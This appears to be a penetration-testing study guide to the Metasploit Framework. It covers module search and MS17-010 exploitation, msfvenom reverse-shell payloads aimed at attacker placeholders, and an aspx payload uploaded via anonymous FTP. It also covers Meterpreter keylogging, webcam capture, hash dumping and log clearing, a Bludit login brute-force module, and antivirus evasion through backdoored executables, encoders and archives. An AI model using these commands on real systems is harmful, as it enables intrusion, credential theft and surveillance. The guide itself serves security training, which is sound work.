## Introduction to Metasploit

Ruby-based modular penetration testing platform for writing, testing, and executing exploit code against a database of pre-built exploits, payloads, and auxiliary modules.

### Metasploit Framework Console

msfconsole is the primary interface to the Framework: full readline support, tab completion, and execution of external commands.

### Architecture

Default install location (ParrotOS), symlinked under `~/.msf4/`.

`/usr/share/metasploit-framework` base install | `modules/` holds `auxiliary` `encoders` `evasion` `exploits` `nops` `payloads` `post` | `plugins/` third-party scripts | `scripts/` meterpreter, ps, resource, shell | `tools/` CLI utilities

## Introduction to MSFconsole

msfconsole is the centralized console interface to the Metasploit Framework.

### Preparation

```bash
msfconsole
msfconsole -q
```

`-q` suppresses the splash banner.

### Installing MSF

```bash
sudo apt update && sudo apt install metasploit-framework
```

### MSF Engagement Structure

- Enumeration (Service Validation, Vulnerability Research)
- Preparation (Code Auditing)
- Exploitation (Module Execution)
- Privilege Escalation
- Post-Exploitation (Pivoting, Data Exfiltration)

## Modules

Modules follow the path syntax `<no.> <type>/<os>/<service>/<name>`, e.g. `794 exploit/windows/ftp/scriptftp_list`.

`No.` index for selection | `Type` module category | `OS` target operating system | `Service` vulnerable service (or general activity for auxiliary/post) | `Name` action performed

`auxiliary` scanning, fuzzing, sniffing, admin | `encoders` keep payload intact to destination | `exploits` deliver payload for a vulnerability | `nops` keep payload size consistent | `payloads` remote code, calls back to attacker | `plugins` extra scripts/automation | `post` gather info, pivot

Only `auxiliary`, `exploits`, and `post` are usable with `use <no.>` as interactable/initiator modules.

### Searching for Modules

```text
search <keyword>
search type:exploit platform:windows cve:<year> rank:excellent <keyword>
search cve:<year> -s name
```

`-o <file>` CSV output | `-S <pattern>` regex filter on results | `-u` auto-use if one result | `-s <column>` sort (rank, date/disclosure_date, name, type, check) | `-r` reverse order

Keywords: `cve` `edb` Exploit-DB ID | `platform` | `port` | `rank` (good/excellent/etc, or numeric) | `type` exploit/payload/auxiliary/encoder/evasion/post/nop | `author` | `date` disclosure date | `check` supports check method

### Module Selection

```bash
nmap -sV <TARGET_IP>
```

```text
search ms17_010
use <no.>
show options
info
```

`info` shows description, targets, and references before committing to a module.

ms17_010_psexec chains EternalRomance/EternalSynergy/EternalChampion: more reliable than EternalBlue but requires a named pipe. ms17_010_eternalblue needs no named pipe but relies on memory corruption (less reliable).

MS17-010 references: https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2017/MS17-010, https://nvd.nist.gov/vuln/detail/CVE-2017-0143, https://nvd.nist.gov/vuln/detail/CVE-2017-0146, https://nvd.nist.gov/vuln/detail/CVE-2017-0147, https://github.com/worawit/MS17-010, https://hitcon.org/2017/CMT/slide-files/d2_s2_r0.pdf, https://blogs.technet.microsoft.com/srd/2017/06/29/eternal-champion-exploit-analysis/

### Using Modules

```text
set RHOSTS <TARGET_IP>
setg RHOSTS <TARGET_IP>
setg LHOST <ATTACKER_IP>
run
```

`setg` persists a value until msfconsole restarts (vs `set`, per-session only).

## Targets

Targets select the OS/version-specific exploit variant within a chosen exploit module.

```text
show targets
set target <index_no>
```

`show targets` outside a selected exploit module returns no result. Target varies by service pack, OS version, language pack, and return address (jmp esp / specific register jump / pop-pop-ret). Comments in module code may flag target-specific requirements.

To identify a target: obtain target binaries, use `msfpescan` to locate a suitable return address.

## Payloads

A payload accompanies an exploit to return a shell or connection to the attacker after successful exploitation. `/` in the payload name indicates staged (`windows/shell/bind_tcp`); no `/` means single (`windows/shell_bind_tcp`).

### Singles

Self-contained, no stage, larger and more stable, but may exceed exploit size limits.

### Stagers

Small, run on the victim, open a connection to the listener, and deliver the stage. NX stagers (Windows) are larger (VirtualAlloc); NX + Win7-compatible is the current default.

### Stages

Downloaded by the stager, no size limit (Meterpreter, VNC Injection). Uses a middle stager since a single `recv()` fails on large payloads.

### Meterpreter Payload

Multi-faceted payload using DLL injection, memory-resident, dynamically loads/unloads extensions. Always loads `stdapi`; loads `priv` if admin rights are obtained. AES-encrypted communication.

### Searching for Payloads

```text
show payloads
grep meterpreter show payloads
grep meterpreter grep reverse_tcp show payloads
grep -c meterpreter show payloads
```

`grep` filters chain; `-c` counts matches.

### Selecting / Using Payloads

```text
set payload <no.>
set LHOST <ATTACKER_IP>
set RHOSTS <TARGET_IP>
ifconfig
run
```

`ifconfig` run from inside msfconsole checks the attacker's own IP for LHOST.

Meterpreter is not a native shell: use `getuid` instead of `whoami`. `shell` drops into the target's native command line within the same session.

### Payload Types (Windows)

`generic/custom` generic listener, multi-use | `generic/shell_bind_tcp` bind TCP shell | `generic/shell_reverse_tcp` reverse TCP shell | `windows/x64/exec` run arbitrary command | `windows/x64/loadlibrary` load arbitrary library | `windows/x64/messagebox` spawn dialog box | `windows/x64/shell_reverse_tcp` single reverse shell | `windows/x64/shell/reverse_tcp` staged reverse shell | `windows/x64/meterpreter/$` Meterpreter + stager varieties | `windows/x64/powershell/$` interactive PowerShell | `windows/x64/vncinject/$` VNC server (reflective injection)

## Encoders

Encoders adapt payload bytes to a target architecture (x64, x86, sparc, ppc, mips) and strip bad characters. AV-evasion value has diminished as detection has improved against known encoder signatures.

`shikata_ga_nai` (x86) - polymorphic XOR additive feedback encoder, once highly evasive, now commonly flagged.

Shikata Ga Nai XOR visualization: https://hatching.io/blog/metasploit-payloads2/

### Legacy: msfpayload + msfencode

Pre-2015 standalone tools, merged into msfvenom.

```bash
msfpayload windows/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

### msfvenom Payload Generation

```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b "\x00" -f perl
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -b "\x00" -f perl -e x86/shikata_ga_nai
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -e x86/shikata_ga_nai -f exe -i 10 -o <OUTPUT_FILE>.exe
```

`-a` architecture | `-b` bad chars to avoid | `-f` output format | `-e` encoder | `-i` encoding iterations | `-o` output file

Multiple SGN iterations are still flagged by most AV; encoding alone is insufficient for evasion today.

### Selecting an Encoder

```text
show encoders
```

Lists encoders compatible with the currently selected exploit + payload combination.

### VirusTotal Check

```bash
msf-virustotal -k <API_KEY> -f <FILE>
```

Requires free VirusTotal registration for an API key.

## Databases

msfconsole's PostgreSQL backend stores hosts, services, credentials, and loot per workspace during an assessment.

### Setting up the Database

```bash
sudo service postgresql status
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
sudo msfdb run
```

If `msfdb init` fails with a Bundler error, update Metasploit (`apt update`) and rerun. If already configured and the password can't be changed, reinit:

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

```text
db_status
```

### Workspaces

```text
workspace
workspace -a <name>
workspace <name>
workspace -d <name>
workspace -D
workspace -r <name>
```

### Importing Scan Results

```text
db_import <FILE>.xml
hosts
services
```

`.xml` is the preferred import format.

### Using Nmap Inside MSFconsole

```text
db_nmap -sV -sS <TARGET_IP>
```

Results auto-populate `hosts`/`services`.

### Data Backup

```text
db_export -f xml <OUTPUT_FILE>.xml
db_export -f pwdump <OUTPUT_FILE>
```

### Hosts / Services

```text
hosts -S <search_string>
hosts -c <col1,col2>
hosts -R
services -p <port1,port2>
services -s <name1,name2>
services -u
```

### Credentials

```text
creds
creds add user:<USERNAME> password:<PASSWORD> realm:<DOMAIN>
creds add user:<USERNAME> ntlm:<HASH>:<HASH>
creds add user:<USERNAME> ssh-key:<FILE>
creds -p <PORT>
creds -t ntlm
creds -d -s smb
```

`-o <file>` export to CSV/JTR/hashcat (`.jtr`/`.hcat` by extension)

### Loot

```text
loot
loot -a <TARGET_IP> -t <TYPE> -f <FILE> -i <INFO>
loot -d <TARGET_IP>
```

## Plugins

Plugins are third-party or community scripts loaded into msfconsole to add commands and automation.

### Using Plugins

```text
load <plugin_name>
load nessus
nessus_help
```

### Installing New Plugins

```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
msfconsole -q
```

```text
load pentest
```

Notable pre-installed plugins: nmap, nexpose, nessus, mimikatz (v1), stdapi, incognito. Other known plugins: railgun, priv, darkoperator's.

## Sessions

Sessions are the control interfaces for exploited targets; they can be backgrounded, interacted with, or converted to jobs.

Background with `[CTRL]+[Z]` or `background` (Meterpreter). Backgrounded sessions persist and run independently; they can die if the payload's communication channel breaks.

```text
sessions
sessions -i <no.>
```

Post-exploitation (`post/`) modules bind to a session via `SESSION`: background the session, search for the module, `set SESSION <no.>`, run.

### Jobs

```text
jobs -l
jobs -i <id>
jobs -k <id>
jobs -K
exploit -j
```

Killing a session with `[CTRL]+[C]` does not free the port in use; use `jobs -k`/`jobs -K` instead.

## Meterpreter

Memory-resident, DLL-injected, extensible payload built for stealthy post-exploitation. Design goals: stealthy, powerful, extensible.

Execution flow: target runs the initial stager (bind/reverse/findtag/passivex) → loads the Reflective DLL → Meterpreter core initializes an AES-encrypted link and sends a GET → loads `stdapi` (always) and `priv` (if admin rights obtained).

### Meterpreter Commands

Core: `background`/`bg` backgrounds session | `migrate` move to another process | `load` load an extension | `run` execute a script/post module | `sessions` switch sessions | `sleep` go quiet, re-establish

File system: `download`/`upload` transfer file or directory | `search` search for files | `checksum` file checksum | `edit` edit a file | `show_mount` list drives/mounts

Networking: `ifconfig`/`ipconfig` interfaces | `netstat` connections | `portfwd` forward local port to remote service | `route` view/modify routing table | `arp` ARP cache

System: `execute` run a command | `getenv` env variables | `getpid` current PID | `getprivs` enable all available privileges | `getsid` SID of running user | `getuid` user the server runs as | `kill`/`pkill`/`pgrep` process control | `ps` list processes | `reg` registry interaction | `shell` drop to native shell | `steal_token` steal impersonation token from a process | `drop_token` relinquish impersonation token | `rev2self` call RevertToSelf | `clearev` clear event log | `reboot`/`shutdown`

User interface: `keyscan_start`/`keyscan_dump`/`keyscan_stop` capture keystrokes | `screenshot` grab desktop image | `screenshare` watch desktop live | `enumdesktops` list desktops

Webcam/Audio: `webcam_list`/`webcam_snap`/`webcam_stream` | `record_mic` | `play` play .wav on target

Priv: `getsystem` escalate to local SYSTEM | `hashdump` dump SAM database | `timestamp` manipulate file MACE attributes

### Using Meterpreter

```text
db_nmap -sV -p- -T5 -A <TARGET_IP>
search <keyword>
use <no.>
set RHOST <TARGET_IP>
set LHOST <ATTACKER_IP>
run
```

### Migration / Token Stealing

```text
getuid
ps
steal_token <PID>
getuid
```

Access-denied on `getuid` after initial exploitation means a less-privileged process was landed on; migrate or steal a token from a more privileged process.

### Local Privilege Escalation

```text
bg
search local_exploit_suggester
use post/multi/recon/local_exploit_suggester
set SESSION <no.>
run
```

Lists local exploits the session is likely vulnerable to. Not all checks are 100% accurate; try each candidate.

```text
use exploit/windows/local/<suggested_exploit>
set session <no.>
set LHOST <ATTACKER_IP>
run
```

### Dumping Hashes

```text
hashdump
lsa_dump_sam
lsa_dump_secrets
```

Both `lsa_dump_*` commands require running as SYSTEM.

## Writing and Importing Modules

Covers installing community/ExploitDB modules manually and porting exploit scripts into Metasploit's Ruby module format.

### Finding Modules

```bash
searchsploit <keyword>
searchsploit -t <keyword> --exclude=".py"
```

`.rb` files are Ruby/Metasploit-module-format scripts; not every `.rb` is automatically MSF-module-compatible.

### Installing a Downloaded Module

```bash
cp <downloaded>.rb /usr/share/metasploit-framework/modules/exploits/<os>/<service>/<name>.rb
msfconsole -m /usr/share/metasploit-framework/modules/
```

```text
loadpath /usr/share/metasploit-framework/modules/
```

```text
reload_all
use exploit/<path>
show options
```

New module filenames must be snake_case, alphanumeric and underscores only (no dashes), or msfconsole fails to recognize them. User-level modules go under `~/.msf4/`, mirroring the folder structure of `/usr/share/metasploit-framework/`.

### Porting Over Scripts into Metasploit Modules

Reuse an existing module in the same category as boilerplate rather than starting from scratch.

`Msf::Exploit::Remote::HttpClient` HTTP client methods | `Msf::Exploit::PhpEXE` generates a first-stage PHP payload | `Msf::Exploit::FileDropper` transfers files and auto-cleans them after the session | `Msf::Auxiliary::Report` reports data to the MSF DB

### Writing Our Module

Bypasses Bludit's brute-force lockout by spoofing `X-Forwarded-For` per login attempt (CVE-2019-17240).

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::PhpEXE
  include Msf::Auxiliary::Report
  
  def initialize(info={})
    super(update_info(info,
      'Name'           => "Bludit 3.9.2 - Authentication Bruteforce Mitigation Bypass",
      'Description'    => %q{
        Versions prior to and including 3.9.2 of the Bludit CMS are vulnerable to a bypass of the anti-brute force mechanism that is in place to block users that have attempted to login incorrectly ten times or more. Within the bl-kernel/security.class.php file, a function named getUserIp attempts to determine the valid IP address of the end-user by trusting the X-Forwarded-For and Client-IP HTTP headers.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'rastating', # Original discovery
          '0ne-nine9'  # Metasploit module
        ],
      'References'     =>
        [
          ['CVE', '2019-17240'],
          ['URL', 'https://rastating.github.io/bludit-brute-force-mitigation-bypass/'],
          ['PATCH', 'https://github.com/bludit/bludit/pull/1090' ]
        ],
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Notes'          =>
        {
          'SideEffects' => [ IOC_IN_LOGS ],
          'Reliability' => [ REPEATABLE_SESSION ],
          'Stability'   => [ CRASH_SAFE ]
        },
      'Targets'        =>
        [
          [ 'Bludit v3.9.2', {} ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "2019-10-05",
      'DefaultTarget'  => 0))
      
     register_options(
      [
        OptString.new('TARGETURI', [true, 'The base path for Bludit', '/']),
        OptString.new('BLUDITUSER', [true, 'The username for Bludit']),
        OptPath.new('PASSWORDS', [ true, 'The list of passwords',
            File.join(Msf::Config.data_directory, "wordlists", "passwords.txt") ])
      ])
  end
  
  # -- Exploit code -- #
  # dirty workaround to remove this warning:
#   Cookie#domain returns dot-less domain name now. Use Cookie#dot_domain if you need "." at the beginning.
# see https://github.com/nahi/httpclient/issues/252
class WebAgent
  class Cookie < HTTP::Cookie
    def domain
      self.original_domain
    end
  end
end

def get_csrf(client, login_url)
  res = client.get(login_url)
  csrf_token = /input.+?name="tokenCSRF".+?value="(.+?)"/.match(res.body).captures[0]
end

def auth_ok?(res)
  HTTP::Status.redirect?(res.code) &&
    %r{/admin/dashboard}.match?(res.headers['Location'])
end

def bruteforce_auth(client, host, username, wordlist)
  login_url = host + '/admin/login'
  File.foreach(wordlist).with_index do |password, i|
    password = password.chomp
    csrf_token = get_csrf(client, login_url)
    headers = {
      'X-Forwarded-For' => "#{i}-#{password[..4]}",
    }
    data = {
      'tokenCSRF' => csrf_token,
      'username' => username,
      'password' => password,
    }
    puts "[*] Trying password: #{password}"
    auth_res = client.post(login_url, data, headers)
    if auth_ok?(auth_res)
      puts "\n[+] Password found: #{password}"
      break
    end
  end
end

#begin
#  args = Docopt.docopt(doc)
#  pp args if args['--debug']
#
#  clnt = HTTPClient.new
#  bruteforce_auth(clnt, args['--root-url'], args['--user'], args['--#wordlist'])
#rescue Docopt::Exit => e
#  puts e.message
#end
```

## Introduction to MSFVenom

msfvenom merges payload generation and encoding (successor to msfpayload + msfencode) into one tool.

### Creating Our Payloads

```bash
nmap -sV -T4 -p- <TARGET_IP>
```

```bash
ftp <TARGET_IP>
```

Login as `anonymous` with any password if allowed.

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f aspx > <OUTPUT_FILE>.aspx
```

```text
put <OUTPUT_FILE>.aspx
```

```text
use multi/handler
set LHOST <ATTACKER_IP>
set LPORT <PORT>
run
```

Start the listener before triggering the payload via its URL.

### Executing the Payload

A triggered `.aspx`/web payload shows a blank page; the payload still runs in the background.

### Local Exploit Suggester

Same `local_exploit_suggester` workflow as under Meterpreter: background the session, search and `use` the module, `set SESSION`, run, then `use` a suggested local exploit with `SESSION`/`LHOST`/`LPORT` set.

## Firewall and IDS/IPS Evasion

Covers endpoint/perimeter defenses, detection methods, and techniques to reduce payload detection.

### Endpoint Protection

Host-based protection: antivirus, antimalware, firewall, anti-DDoS (e.g. Avast, Nod32, Malwarebytes, BitDefender).

### Perimeter Protection

Edge devices controlling access between public and private networks, often via a DMZ (lower security than internal, higher trust than the internet).

### Security Policies

Allow/deny rules applied to network traffic, applications, user access, file management, and DDoS protection.

`Signature-based` match against known attack patterns | `Heuristic/Statistical Anomaly` behavioral deviation from a baseline | `Stateful Protocol Analysis` deviation from accepted protocol profiles | `Live-monitoring/SOC` analyst-reviewed live feeds

### Evasion Techniques

MSF6 tunnels AES-encrypted Meterpreter traffic, mitigating signature-based network IDS/IPS. Executable payloads can still be fingerprinted on disk before execution.

```bash
msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -k -x <TEMPLATE_FILE>.exe -e x86/shikata_ga_nai -a x86 --platform windows -o <OUTPUT_FILE>.exe -i 5
```

`-x` inject payload into an existing executable template (backdooring) | `-k` keep the template's original execution running in a separate thread

A `-k` backdoored exe launched from a CLI still pops a visible payload window.

### Archives

Password-protected archives bypass many AV signatures (flagged separately as "unable to scan"). Double-archiving and stripping the extension reduces detection further.

```bash
rar a <OUTPUT_FILE>.rar -p <FILE>
mv <OUTPUT_FILE>.rar <OUTPUT_FILE>
rar a <OUTPUT_FILE_2>.rar -p <OUTPUT_FILE>
mv <OUTPUT_FILE_2>.rar <OUTPUT_FILE_2>
```

```bash
wget https://www.rarlab.com/rar/rarlinux-x64-612.tar.gz
tar -xzvf rarlinux-x64-612.tar.gz && cd rar
```

### Packers

Executable compression combining payload and decompression code into one file as another evasion layer.

Popular packers: UPX, The Enigma Protector, MPRESS, Alternate EXE Packer, ExeStealth, Morphine, MEW, Themida.

### Exploit Coding

Randomizing buffer offsets and avoiding obvious NOP sleds helps evade IDS/IPS signature matching on exploit code.

```ruby
'Targets' =>
[
    [ 'Windows 2000 SP4 English', { 'Ret' => 0x77e14c29, 'Offset' => 5093 } ],
],
```

## MSF6 Updates

August 2020 changes: AES encryption for all Meterpreter implementations (Windows, Python, Java, Mettle, PHP), SMBv3 client support, polymorphic payload generation.

Upgrading to MSF6 breaks existing MSF5 payload sessions; MSF5-generated payloads are incompatible with MSF6 communication. `load mimikatz` now loads Kiwi (Mimikatz extension replaced).

Changelog: https://www.rapid7.com/blog/post/2020/08/06/metasploit-6-now-under-active-development/